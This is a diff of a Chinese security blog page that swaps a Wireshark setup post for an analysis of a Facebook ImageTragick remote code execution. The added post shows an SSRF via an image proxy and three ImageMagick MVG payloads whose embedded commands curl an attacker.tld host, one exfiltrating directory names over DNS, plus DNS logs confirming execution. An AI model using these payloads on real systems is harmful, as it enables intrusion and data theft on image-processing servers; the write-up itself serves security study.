@@ -6,54 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://adrain09.github.io">
-  <title>wireshark 普通用户启动 | NoSec World</title>
+  <title>facebook 命令执行 | NoSec World</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="添加wireshark用户组
-
-1sudo groupadd wireshark
-
-将dumpcap更改为wireshark用户组
-
-1sudo chgrp wireshark /usr/bin/dumpcap
-
-让wireshark用户组有root权限使用dumpcap
-
-1sudo chmod 4755 /usr/bin/dumpcap
-
-将需要使用的用户名加入wireshark用户组，我的">
+  <meta name="description" content="文章地址：http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
+对文章中的过程进行了简单的分析：
+分析在facebook分享页面会有个图像的链接地址:
+https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;amp;link=link.example.t">
 <meta property="og:type" content="article">
-<meta property="og:title" content="wireshark 普通用户启动">
-<meta property="og:url" content="https://adrain09.github.io/2016/12/19/移动安全/wireshark 普通用户启动/index.html">
+<meta property="og:title" content="facebook 命令执行">
+<meta property="og:url" content="https://adrain09.github.io/2017/01/18/安全测试/facebook命令执行/index.html">
 <meta property="og:site_name" content="NoSec World">
-<meta property="og:description" content="添加wireshark用户组
-
-1sudo groupadd wireshark
-
-将dumpcap更改为wireshark用户组
-
-1sudo chgrp wireshark /usr/bin/dumpcap
-
-让wireshark用户组有root权限使用dumpcap
-
-1sudo chmod 4755 /usr/bin/dumpcap
-
-将需要使用的用户名加入wireshark用户组，我的">
-<meta property="og:updated_time" content="2016-12-21T03:00:51.101Z">
+<meta property="og:description" content="文章地址：http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
+对文章中的过程进行了简单的分析：
+分析在facebook分享页面会有个图像的链接地址:
+https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;amp;link=link.example.t">
+<meta property="og:updated_time" content="2017-01-18T03:32:46.423Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="wireshark 普通用户启动">
-<meta name="twitter:description" content="添加wireshark用户组
-
-1sudo groupadd wireshark
-
-将dumpcap更改为wireshark用户组
-
-1sudo chgrp wireshark /usr/bin/dumpcap
-
-让wireshark用户组有root权限使用dumpcap
-
-1sudo chmod 4755 /usr/bin/dumpcap
-
-将需要使用的用户名加入wireshark用户组，我的">
+<meta name="twitter:title" content="facebook 命令执行">
+<meta name="twitter:description" content="文章地址：http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html
+对文章中的过程进行了简单的分析：
+分析在facebook分享页面会有个图像的链接地址:
+https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;amp;link=link.example.t">
   
     <link rel="alternative" href="/atom.xml" title="NoSec World" type="application/atom+xml">
   
@@ -194,40 +167,50 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-移动安全/wireshark 普通用户启动" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-安全测试/facebook命令执行" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      wireshark 普通用户启动
+      facebook 命令执行
     </h1>
   
 
-        <a href="/2016/12/19/移动安全/wireshark 普通用户启动/" class="archive-article-date">
-  	<time datetime="2016-12-19T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-19</time>
+        <a href="/2017/01/18/安全测试/facebook命令执行/" class="archive-article-date">
+  	<time datetime="2017-01-18T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-18</time>
 </a>
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>添加wireshark用户组</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo groupadd wireshark</div></pre></td></tr></table></figure>
-<ol>
-<li>将dumpcap更改为wireshark用户组</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chgrp wireshark /usr/bin/dumpcap</div></pre></td></tr></table></figure>
-<ol>
-<li>让wireshark用户组有root权限使用dumpcap</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 4755 /usr/bin/dumpcap</div></pre></td></tr></table></figure>
-<ol>
-<li>将需要使用的用户名加入wireshark用户组，我的用户名是craftor</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gpasswd -a craftor wireshark</div></pre></td></tr></table></figure>
+        <p>文章地址：<a href="http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html" target="_blank" rel="external">http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html</a></p>
+<p>对文章中的过程进行了简单的分析：</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在facebook分享页面会有个图像的链接地址:</p>
+<p><a href="https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;link=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=1476569763&amp;hash=" target="_blank" rel="external">https://www.facebook.com/dialog/feed?app_id=APP_ID&amp;link=link.example.tld&amp;picture=http%3A%2F%2Fattacker.tld%2Fexploit.png&amp;name=news_name&amp;caption=news_caption&amp;description=news_descriotion&amp;redirect_uri=http%3A%2F%2Fwww.facebook.com&amp;ext=1476569763&amp;hash=</a></p>
+<p>在页面中会对图像进行处理，变成连接：</p>
+<p><a href="https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb" target="_blank" rel="external">https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb</a></p>
+<p>源地址为：</p>
+<p><a href="https://www.google.com/images/errors/robot.png" target="_blank" rel="external">https://www.google.com/images/errors/robot.png</a></p>
+<p>注意到一点，源地址图像大小为171×213，而处理后的图像大小为158×158</p>
+<h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p><a href="https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb" target="_blank" rel="external">https://external.fhen1-1.fna.fbcdn.net/safe_image.php?d=AQDaeWq2Fn1Ujs4P&amp;w=158&amp;h=158&amp;url=https%3A%2F%2Fwww.google.com%2Fimages%2Ferrors%2Frobot.png&amp;cfs=1&amp;upscale=1&amp;_nc_hash=AQD2uvqIgAdXgWyb</a></p>
+<p>url中存在ssrf漏洞</p>
+<h3 id="ImageMagick命令执行"><a href="#ImageMagick命令执行" class="headerlink" title="ImageMagick命令执行"></a>ImageMagick命令执行</h3><p>这个是图像处理时候产生的漏洞，从第一步可以看到图像进行了大小的处理，有可能会存在ImageMagick命令执行</p>
+<p>利用第一个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://attacker.tld/&quot; -d @- &gt; /dev/null`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>没有成功</p>
+<h3 id="利用dns传输"><a href="#利用dns传输" class="headerlink" title="利用dns传输"></a>利用dns传输</h3><p>第二个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60curl &quot;http://record_under_attacker_controled_ns_server.attacker.tld/&quot; -d @- &gt; /dev/null`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>利用了自己能控制的dns解析，得到结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IP: 31.13.*.*; NetName: LLA1-11</div><div class="line">NAME: record_under_attacker_controled_ns_server.attacker.tld, Type: A</div></pre></td></tr></table></figure>
+<p>命令得到了执行</p>
+<p>第三个payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;https://127.0.0.1/x.php?x=%60for i in $(ls /) ; do curl &quot;http://$i.attacker.tld/&quot; -d @- &gt; /dev/null; done`&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">NAME: home.attacker.tld, Type: A</div><div class="line">NAME: boot.attacker.tld, Type: 28</div><div class="line">NAME: dev.attacker.tld, Type: 28</div><div class="line">NAME: bin.attacker.tld, Type: A</div><div class="line">…</div></pre></td></tr></table></figure>
+<p>id执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NAME: uid=99(nobody).attacker.tld., Type: 28</div><div class="line">NAME: groups=99(nobody).attacker.tld., Type: A</div><div class="line">NAME: gid=99(nobody).attacker.tld., Type: A</div></pre></td></tr></table></figure>
 
       
 
@@ -259,7 +242,7 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
 	</div>
 
       
@@ -312,7 +295,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://adrain09.github.io/2016/12/19/移动安全/wireshark 普通用户启动/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://adrain09.github.io/2017/01/18/安全测试/facebook命令执行/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -326,18 +309,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/12/21/软件/docker常用命令/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          docker 常用命令
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">中间人攻击获取ssl数据</div>
+    <a href="/2017/01/17/web安全/Blob_urls/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">H5中的Object URL</div>
       <i class="icon-circle-right"></i>
     </a>
   
